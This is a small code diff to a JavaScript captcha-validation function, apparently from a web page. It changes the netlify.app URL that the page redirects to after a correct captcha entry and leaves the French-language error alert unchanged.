@@ -30,10 +30,11 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://stupendous-pony-72550f.netlify.app/wet3.html";
+        targetURL="https://wetrandft.netlify.app/wet.html";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
         createCaptcha();
     }
 }
+
